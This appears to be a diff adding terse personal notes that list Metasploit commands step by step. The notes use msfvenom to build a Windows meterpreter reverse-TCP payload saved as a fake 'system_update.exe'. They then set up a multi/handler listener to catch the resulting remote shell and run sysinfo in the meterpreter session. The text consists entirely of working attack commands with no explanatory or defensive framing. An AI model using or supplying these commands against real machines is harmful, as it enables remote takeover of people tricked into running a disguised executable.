@@ -1,0 +1,20 @@
+1     Msf venom-
+2
+3      ifconfig
+4                    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.47.128 lport=4444 -f exe > system_update.exe
+
+5    msfconsole
+
+6    use exploit/multi/handler
+I
+7     set payload windows/meterpreter/reverse_tcp
+
+8     show options
+
+9     set lhost 192.168.47.128
+
+10    run
+
+11     meterpreter > sysinfo
+
+12     --help
